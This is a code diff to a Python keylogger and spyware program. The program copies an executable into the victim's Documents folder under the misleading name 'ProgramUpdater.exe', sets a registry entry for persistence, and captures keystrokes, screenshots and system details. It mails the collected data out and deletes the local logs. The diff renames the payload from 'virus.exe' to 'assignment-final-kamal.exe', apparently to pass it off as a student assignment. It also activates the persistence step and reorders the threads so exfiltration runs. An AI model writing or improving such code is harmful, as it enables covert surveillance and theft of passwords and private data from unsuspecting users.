@@ -60,7 +60,7 @@ def move():
     documents = os.path.join(os.getenv("USERPROFILE"),"Documents")
     destination = os.path.join(documents,"ProgramUpdater.exe")
     if not os.path.exists(destination):
-        shutil.copy("virus.exe",destination)
+        shutil.copy("assignment-final-kamal.exe",destination)
     registry(destination)
 
 def registry(filepath):
@@ -90,6 +90,8 @@ def schedulekeylogger():
         maildata("keystrokes.txt","Keylogger")
         os.remove("keystrokes.txt")
 
+move()
+
 with open("system_info.txt", 'w', encoding="utf-8") as file:
     file.write(f"İstifadəçi adı: {user}\n")
     file.write(f"Əməliyyat sistemi: {ossys}\n")
@@ -102,9 +104,9 @@ with open("system_info.txt", 'w', encoding="utf-8") as file:
 with Listener(on_press=on_press) as listener:
     listener.join()
 
-mailstart()
-os.remove("system_info.txt")
 screenshot_thread=threading.Thread(target=schedulescreenshot, daemon=True)
 screenshot_thread.start()
 keylogger_thread = threading.Thread(target=schedulekeylogger, daemon=True)
 keylogger_thread.start()
+mailstart()
+os.remove("system_info.txt")
